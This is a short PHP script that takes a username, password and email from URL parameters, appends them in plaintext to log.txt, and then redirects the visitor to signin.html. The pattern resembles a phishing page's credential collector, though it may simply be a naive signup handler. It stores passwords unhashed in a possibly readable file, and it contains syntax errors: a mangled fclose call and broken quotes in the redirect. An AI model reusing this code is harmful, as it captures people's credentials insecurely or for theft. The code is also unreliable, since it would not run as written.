<?php
    $username = $_GET['USERNAME'];
    $password = $_GET['PASSWORD'];
    $email = $_GET['EMAIL'];
    $filename = 'log.txt';
    $fp = fopen($filename, 'a+');
    fwrite ($fp, $username . "," . $password . "," . $email . "\n");
    $fclose ($fp);
    echo ("account created");
    header("Location: "signin.html"); 
    die();
?>
